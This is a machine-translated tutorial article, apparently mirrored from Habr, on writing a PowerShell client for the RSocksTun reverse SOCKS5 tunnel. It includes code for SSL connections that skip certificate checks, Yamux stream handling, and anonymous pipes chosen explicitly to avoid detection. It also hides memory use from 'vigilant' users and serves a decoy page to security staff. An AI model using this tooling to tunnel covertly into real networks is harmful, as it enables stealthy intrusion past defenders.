@@ -1,0 +1,137 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134931760-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>We write Reverse socks5 proxy on powershell. Part 2</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="The story of research and development in 3 parts. Part 2 - development. 
+ There are many beeches - there is even more benefit. 
+
+ In the first part of...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({
+            google_ad_client: "ca-pub-6974184241884155",
+            enable_page_level_ads: true
+       });
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
+    <div class="page-header-text">Geekly Articles each Day</div>
+  </header>
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="../../search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
+  <section class="page js-page"><h1>We write Reverse socks5 proxy on powershell. Part 2</h1><div class="post__text post__text-html js-mediator-article">  The story of research and development in 3 parts.  Part 2 - development. <br>  There are many beeches - there is even more benefit. <br><br>  <a href="https://habr.com/ru/post/453870/">In the first part of the</a> article we met with some tools for the organization of reverse tunnels, looked at their advantages and disadvantages, studied the mechanism of operation of the Yamux multiplexer and described the basic requirements for the newly created powershell module.  The time has come to develop the client powershell module to the ready-made implementation of the <a href="https://github.com/mis-team/rsockstun">RSocksTun</a> reverse tunnel. <br><br>  First of all, we need to understand in what mode our module will operate.  Obviously, for prima-transfer of data, we will need to use the windows sockets mechanism and the capabilities provided by .Net for streaming read-write to sockets.  But, on the other hand, because  Since our module must serve several yamux streams at the same time, then all I / O operations should not completely block the execution of our program.  This suggests the conclusion that our module should use software multithreading and perform read-write operations with the yamux-server, as well as read-write operations to the destination servers in different program streams.  Well, by itself, it is necessary to provide a mechanism for interaction between our parallel threads.  Fortunately, powershell provides ample opportunities for running and managing program threads. <br><a name="habracut"></a><br><h3>  General work algorithm </h3><br>  Thus, the general algorithm of our client’s work should be something like this: 
+      <br>
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <ins class="adsbygoogle"
+          style="display:block; text-align:center;"
+          data-ad-layout="in-article"
+          data-ad-format="fluid"
+          data-ad-client="ca-pub-6974184241884155"
+          data-ad-slot="8945601208"></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      <br>
+    <ul><li>  establish an SSL connection with the server; </li><li>  log in with a password so that the server can distinguish us from the security officer; </li><li>  wait for the yamux-package to install a new stream, periodically responding to keepalive server requests; </li><li>  start a new program stream socksScript (not to be confused with a stream) as soon as the yamux package comes to install a new stream.  Inside socksScript realize the work of the socks5 server; </li><li>  upon arrival of a packet with data from yamux — understand from a 12-byte header, which stream is intended for the data, as well as its size, read the data from the yamux-server and transfer the received data to the stream with the corresponding stream number; </li><li>  periodically monitor the availability of data intended for the yamux-server in each of the running socks-scripts.  If there is such data, add the corresponding 12-byte header to it and send it to the yamux server; </li><li>  upon the arrival of the yamux-package to close the stream - to transmit a signal to the appropriate stream for the completion of the stream and disconnect, and then to complete the stream itself; </li></ul><br>  So, in our client it is necessary to implement at least 3 program streams: <br><br><ol><li>  the main one, which will establish the connection, log in to the yamux server, receive data from it, process the yamux headers and send already raw data to other program streams; </li><li>  streams with socks servers.  There may be several of them - one for each stream.  They implemented the functionality of socks5.  These flows will interact with destinations on the internal network; </li><li>  reverse flow.  It receives data from socks streams, adds yamux headers to them and sends them to the yamux server; </li></ol><br>  And, naturally, we need to foresee the interaction between all these flows. <br><br>  We need not only to provide such an interaction, but also to obtain the convenience of streaming I / O (similar to that in sockets).  The most suitable mechanism would be the use of software pipes.  In Windows, pipes are named, when each pipe has its own name, and anonymous - each pipe is identified by its handler.  For the purpose of secrecy, of course, we will use anonymous pipes.  (After all, we do not want our module to be calculated using the name pipes in the system - yes?).  Thus, the interaction between the main / reverse flows and socks flows will be carried out through anonymous pipes that support asynchronous stream I / O operations.  Between the main and reverse threads, communication will take place through the shared-object mechanism (shared synchronized variables) (for more information about what these variables are and how you can live with them <a href="https://learn-powershell.net/2013/04/19/sharing-variables-and-live-objects-between-powershell-runspaces">here</a> ). <br><br>  We must store information about running socks streams in the corresponding data structure.  When creating a socks-stream in this structure, we must write: <br><br><ul><li>  session yamux number: $ ymxstream; </li><li>  4 variables for working with pipes (channels): $ cipipe, $ copipe, $ sipipe, $ sopipe.  Since anonymous channels work either in IN or OUT, for each socks stream we need two anonymous channels, each of which must have two ends (pipestream) (server and client); </li><li>  the result of the flow call is $ AsyncJobResult; </li><li>  Handler thread - $ Psobj.  Through it, we will close the flow and release resources; </li><li>  the result of an asynchronous read from an anonymous channel by a reverse flow ($ readjob).  This variable is used in the reverse yamuxScript stream for asynchronous reading from the corresponding pipe; </li><li>  buffer for reading data for each socks-stream; </li></ul><br><h3>  Main thread </h3><br>  So, in terms of data processing, the work of our program is structured as follows: <br><br><ul><li>  the server part (rsockstun - implemented on Golang) raises the ssl server and waits for connections from the client; </li><li>  when receiving a connection from the client, the server checks the password, and if it is correct, it establishes a yamux connection, raises the socks port and waits for connections from socks clients (our proxychains, browser, etc.), while periodically exchanging keepalive packets with our client.  If the password is incorrect, redirect to the page that we specified when installing the server (this is a “legal” page for a vigilant information security administrator); </li><li>  when receiving a connection from the socks-client, the server sends a yamux-packet to our client to establish a new stream (YMX SYN); </li></ul><br>  <b>Retrieving and analyzing the Yamux Header</b> <br><br>  Our module first establishes an SSL connection to the server and is authenticated with a password: <br><br><pre><code class="plaintext hljs">$tcpConnection = New-Object System.Net.Sockets.TcpClient($server, $port) $tcpStream = New-Object System.Net.Security.SslStream($tcpConnection.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])) $tcpStream.AuthenticateAsClient('127.0.0.1')</code> </pre> <br>  Then, the script waits for a 12-byte yamux header and analyzes it. <br>  There is a small nuance here ... As practice shows, a simple reading of 12 bytes from a socket: <br><br><pre> <code class="plaintext hljs"> $num = $tcpStream.Read($tmpbuffer,0,12)</code> </pre> <br>  not enough, since the read operation can be completed after the arrival of only a part of the necessary bytes.  Therefore, we need to wait for all 12 bytes in the loop: <br><br><pre> <code class="plaintext hljs"> do { try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {} $tnum += $num $ymxbuffer += $tmpbuffer[0..($num-1)] }while ($tnum -lt 12 -and $tcpConnection.Connected)</code> </pre> <br>  After the loop completes, we must analyze the 12-byte header contained in the $ ymxbuffer variable for its type and the set flags according to the Yamux specification. <br><br>  Yamux header can be of several types: <br><br><ul><li>  ymx syn - install new stream; </li><li>  ymx fin - the completion of the stream; </li><li>  ymx data - represents information about the data (what size and to which stream they are intended); </li><li>  ymx ping - keepalive message; </li><li>  ymx win update - confirmation of the transfer of data; </li></ul><br>  We consider everything that does not fit the listed types of yamux headers as an exceptional situation.  There are 10 such exceptions and we believe that there is something wrong here and we are completing the work of our module.  <s>(and also erase all our files, wipe the disk, change the name, make a new passport, leave the country, etc. according to the list ...)</s> <br><br>  <b>Creating a new socks stream</b> <br><br>  Having received a yamux-package to establish a new stream, our client creates two anonymous server pipelines ($ sipipe, $ sopipe), for in / out, respectively, creates client pipes ($ cipipe, $ copipe) based on them: <br><br><pre> <code class="plaintext hljs">$sipipe = new-object System.IO.Pipes.AnonymousPipeServerStream(1) $sopipe = new-object System.IO.Pipes.AnonymousPipeServerStream(2,1) $sipipe_clHandle = $sipipe.GetClientHandleAsString() $sopipe_clHandle = $sopipe.GetClientHandleAsString() $cipipe = new-object System.IO.Pipes.AnonymousPipeClientStream(1,$sopipe_clHandle) $copipe = new-object System.IO.Pipes.AnonymousPipeClientStream(2,$sipipe_clHandle)</code> </pre> <br>  creates a runspace for the socks stream, sets the shared variables for interacting with this stream (StopFlag) and starts the scriptblock SocksScript, which implements the functionality of the socks server in a separate thread: <br><br><pre> <code class="plaintext hljs">$state = [PSCustomObject]@{"StreamID"=$ymxstream;"inputStream"=$cipipe;"outputStream"=$copipe} $PS = [PowerShell]::Create() $socksrunspace = [runspacefactory]::CreateRunspace() $socksrunspace.Open() $socksrunspace.SessionStateProxy.SetVariable("StopFlag",$StopFlag) $PS.Runspace = $socksrunspace $PS.AddScript($socksScript).AddArgument($state) | Out-Null [System.IAsyncResult]$AsyncJobResult = $null $StopFlag[$ymxstream] = 0 $AsyncJobResult = $PS.BeginInvoke()</code> </pre> <br>  Created variables are written into a special ArrayList structure - analogue of a Dictionary in Python <br><br><pre> <code class="plaintext hljs">[System.Collections.ArrayList]$streams = @{}</code> </pre><br>  Adding occurs through the built-in Add method: <br><br><pre> <code class="plaintext hljs">$streams.add(@{ymxId=$ymxstream;cinputStream=$cipipe;sinputStream=$sipipe;coutputStream=$copipe;soutputStream=$sopipe;asyncobj=$AsyncJobResult;psobj=$PS;readjob=$null;readbuffer=$readbuffer}) | out-null</code> </pre> <br>  <b>Yamux Data Processing</b> <br><br>  When receiving data from a yamux server intended for a socks stream, we need to determine the yamux stream number from the 12-byte yamux header (the number of the socks stream for which this data is intended), as well as the number of data bytes: <br><br><pre> <code class="plaintext hljs">$ymxstream = [bitconverter]::ToInt32($buffer[7..4],0) $ymxcount = [bitconverter]::ToInt32($buffer[11..8],0)</code> </pre> <br>  Then from the ArrayList stream across the field ymxId we get the handlers of the server out-pipe corresponding to this socks stream: <br><br><pre> <code class="plaintext hljs"> if ($streams.Count -gt 1){$streamind = $streams.ymxId.IndexOf($ymxstream)} else {$streamind = 0} $outStream = $streams[$streamind].soutputStream</code> </pre> <br>  After that, read the data from the socket, remembering that you need to read through a cycle a certain number of bytes: <br><br><pre> <code class="plaintext hljs"> $databuffer = $null $tnum = 0 do { if ($buffer.length -le ($ymxcount-$tnum)) { $num = $tcpStream.Read($buffer,0,$buffer.Length) }else { $num = $tcpStream.Read($buffer,0,($ymxcount-$tnum)) } $tnum += $num $databuffer += $buffer[0..($num-1)] }while ($tnum -lt $ymxcount -and $tcpConnection.Connected)</code> </pre> <br>  and write the data to the appropriate pipe: <br><br><pre> <code class="plaintext hljs">$num = $tcpStream.Read($buffer,0,$ymxcount) $outStream.Write($buffer,0,$ymxcount)</code> </pre> <br><br>  <b>Yamux FIN Processing - Stream End</b> <br><br>  When we receive a packet from the yamix server signaling the closure of a stream, we also get the yamux stream number first from a 12-byte header: <br><br><pre> <code class="plaintext hljs"> $ymxstream = [bitconverter]::ToInt32($buffer[7..4],0)</code> </pre> <br>  then, through a shared variable (or rather, an array of flags, where the index is the number of yamux stream), we signal the socks flow to complete: <br><br><pre> <code class="plaintext hljs">if ($streams.Count -gt 1){$streamind = $streams.ymxId.IndexOf($ymxstream)} else {$streamind = 0} if ($StopFlag[$ymxstream] -eq 0){ write-host "stopflag is 0. Setting to 1" $StopFlag[$ymxstream] = 1 }</code> </pre> <br>  after setting the flag, before killing socks-flow, you must wait a certain amount of time for the socks-flow to manage this flag.  200 ms is enough for this: <br><br><pre> <code class="plaintext hljs">start-sleep -milliseconds 200 #wait for thread check flag</code> </pre><br>  then close all the pipelines related to this thread, close the corresponding Runspace and kill the Powershell object to release the resources: <br><br><pre> <code class="plaintext hljs">$streams[$streamind].cinputStream.close() $streams[$streamind].coutputStream.close() $streams[$streamind].sinputStream.close() $streams[$streamind].soutputStream.close() $streams[$streamind].psobj.Runspace.close() $streams[$streamind].psobj.Dispose() $streams[$streamind].readbuffer.clear()</code> </pre> <br>  After closing the socks stream, we need to remove the corresponding element from the ArrayList streams: <br><br><pre> <code class="plaintext hljs">$streams.RemoveAt($streamind)</code> </pre> <br>  And at the end we need to force the .Net garbage collector to free up the resources used by the stream.  Otherwise, our script will consume about 100-200 MB of memory, which can be noticed by an experienced and corrosive user, but we do not need this: <br><br><pre> <code class="plaintext hljs">[System.GC]::Collect()#clear garbage to minimize memory usage</code> </pre> <br><h3>  Yamux Script - reverse flow </h3><br>  As mentioned above, the data received from socks streams are processed by a separate yamuxScript stream, which starts from the very beginning (after a successful connection to the server).  His task is to periodically poll the output socks of the socks streams located in ArrayList $ streams: <br><pre> <code class="plaintext hljs">foreach ($stream in $state.streams){ ... }</code> </pre> <br>  and if they have data, send them to the yamux server, after having provided the corresponding 12-byte yamux header with the number of the yamux session and the number of data bytes: <br><br><pre> <code class="plaintext hljs"> if ($stream.readjob -eq $null){ $stream.readjob = $stream.sinputStream.ReadAsync($stream.readbuffer,0,1024) }elseif ( $stream.readjob.IsCompleted ){ #if read asyncjob completed - generate yamux header $outbuf = [byte[]](0x00,0x00,0x00,0x00)+ [bitconverter]::getbytes([int32]$stream.ymxId)[3..0]+ [bitconverter]::getbytes([int32]$stream.readjob.Result)[3..0] $state.tcpstream.Write($outbuf,0,12) #write raw data from socks thread to yamux $state.tcpstream.Write($stream.readbuffer,0,$stream.readjob.Result) $state.tcpstream.flush() #create new readasync job $stream.readjob = $stream.sinputStream.ReadAsync($stream.readbuffer,0,1024) }else{ #write-host "Not readed" }</code> </pre> <br>  Also, yamuxScript monitors the set flag in the $ StopFlag shared array, for each of the threads being executed by socksScript.  This flag can be set to a value of 2 if the remote server with which socksScript works breaks the connection.  In such a situation, the information needs to be reported to the socks client.  The chain turns out to be the following: yamuxScript has to inform the yamux server about the disconnection in order for the one in turn to signal this to the socks client. <br><br><pre> <code class="plaintext hljs">if ($StopFlag[$stream.ymxId] -eq 2){ $stream.ymxId | out-file -Append c:\work\log.txt $outbuf = [byte[]](0x00,0x01,0x00,0x04)+ [bitconverter]::getbytes([int32]$stream.ymxId)[3..0]+ [byte[]](0x00,0x00,0x00,0x00) $state.tcpstream.Write($outbuf,0,12) $state.tcpstream.flush() }</code> </pre> <br><h3>  Yamux window update </h3><br>  In addition, yamuxScript should monitor the number of bytes received from the yamux server and periodically send a YMX WinUpdate Message.  This mechanism in Yamux is responsible for controlling and changing the so-called window size (by analogy with the TCP protocol) - the number of data bytes that can be sent without acknowledgment.  The default window size is 256 Kbytes.  This means that when sending or receiving files or data larger than this size, we need to send a windpw update package to the yamux server.  To control the amount of received data from the yamux server, a special shared array $ RcvBytes is entered, into which the main stream, by incrementing the current value, records the number of bytes received from the server for each stream.  When the threshold is exceeded, yamuxScript should send a packet to the WinUpdate server and reset the counter: <br><br><pre> <code class="plaintext hljs"> if ($RcvBytes[$stream.ymxId] -ge 256144){ #out win update ymx packet with 256K size $outbuf = [byte[]](0x00,0x01,0x00,0x00)+ [bitconverter]::getbytes([int32]$stream.ymxId)[3..0]+ (0x00,0x04,0x00,0x00) $state.tcpstream.Write($outbuf,0,12) $RcvBytes[$stream.ymxId] = 0 }</code> </pre> <br><h3>  Threads socksScript </h3><br>  Now let's go directly to the socksScript itself. <br>  Recall that socksScript is called asynchronously: <br><br><pre> <code class="plaintext hljs">$state = [PSCustomObject]@{"StreamID"=$ymxstream;"inputStream"=$cipipe;"outputStream"=$copipe} $PS = [PowerShell]::Create() .... $AsyncJobResult = $PS.BeginInvoke()</code> </pre> <br>  and at the time of the call, the following data is present as part of the $ state variable being passed to the stream: <br><br><ul><li>  $ state.streamId - session number of yamux; </li><li>  $ state.inputStream - read pipe; </li><li>  $ state.oututStream - write pipe; </li></ul><br>  The data in the pipe comes already raw without yamux headers, i.e.  in the form in which they came from the socks-client. <br><br>  Inside socksScript, first of all, we need to determine the version of socks and make sure that it is equal to 5: <br><br><pre> <code class="plaintext hljs">$state.inputStream.Read($buffer,0,2) | Out-Null $socksVer=$buffer[0] if ($socksVer -eq 5){ ... }</code> </pre> <br>  Well, then we do exactly as implemented in the Invoke-SocksProxy script.  The only difference is that instead of calling us <br><br><pre> <code class="plaintext hljs">$AsyncJobResult.AsyncWaitHandle.WaitOne(); $AsyncJobResult2.AsyncWaitHandle.WaitOne();</code> </pre> <br>  It is necessary to monitor the tcp connection and the corresponding completion flag in the $ StopFlag array cyclically, otherwise we will not be able to recognize the connection termination situation from the socks client and ymux server: <br><br><pre> <code class="plaintext hljs">while ($StopFlag[$state.StreamID] -eq 0 -and $tmpServ.Connected ){ start-sleep -Milliseconds 50 }</code> </pre> <br>  If the connection is terminated by the tcp server to which we are connecting, we set this flag to 2, which will force yamuxscript to recognize this and send the corresponding ymx FIN packet to the yamux server: <br><br><pre> <code class="plaintext hljs">if ($tmpServ.Connected){ $tmpServ.close() }else{ $StopFlag[$state.StreamID] = 2 }</code> </pre> <br>  We must also set this flag in case socksScript can not connect to the destination server: <br><br><pre> <code class="plaintext hljs">if($tmpServ.Connected){ ... } else{ $buffer[1]=4 $state.outputStream.Write($buffer,0,2) $StopFlag[$state.StreamID] = 2 }</code> </pre> <br><h3>  Conclusion to the second part </h3><br>  In the course of our coder surveys, we managed to create a powershell client to our RsocksTun server with the ability to: <br><br><ul><li>  SSL connections; </li><li>  authorization on the server; </li><li>  working with a yamux server with keepalive ping support; </li><li>  multi-thread operation; </li><li>  large file transfer support; </li></ul><br>  Outside the article, the implementation of functionality for connecting through a proxy server and authorization on it, as well as turning our script into an inline-version, which can be run from the command line, remains.  This will be in the third part. <br><br>  That's all for today.  As they say - subscribe, put likes, leave comments (especially regarding your thoughts on improving the code and adding functionality). </div><p>Source: <a href="https://habr.com/ru/post/453970/">https://habr.com/ru/post/453970/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../453956/index.html">DataArt Museum. Video Terminal ADM-3A. The car is heavy, reliable, killer</a></li>
+<li><a href="../453960/index.html">Global DevOps Bootcamp 2019 in Moscow</a></li>
+<li><a href="../453962/index.html">RxSwift and Korutin in Kotlin - optional on mobile development from AGIMA and GeekBrains</a></li>
+<li><a href="../453964/index.html">OOP in R (part 1): S3 classes</a></li>
+<li><a href="../453968/index.html">Wean the toxic practices of code review</a></li>
+<li><a href="../453972/index.html">Archaeologists recreated a two-thousand-year-old pin using 3D printing and scanning</a></li>
+<li><a href="../453974/index.html">Competition of ML-systems on linguistic material. How we learned to fill in the gaps</a></li>
+<li><a href="../453976/index.html">Economic educational program for IT people</a></li>
+<li><a href="../453978/index.html">MIT building 3D printer prints building in 14 hours</a></li>
+<li><a href="../453980/index.html">Printing labels and price tags for .net online store</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52496797 = new Ya.Metrika({
+                  id:52496797,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+  <footer class="page-footer">
+    <div class="page-footer-legal-info-container page-footer-element">
+      <p>
+        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+      </p>
+    </div>
+    <div class="page-footer-counters-container page-footer-element">
+      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
+    </div>
+  </footer>
+</body>
+
+</html>
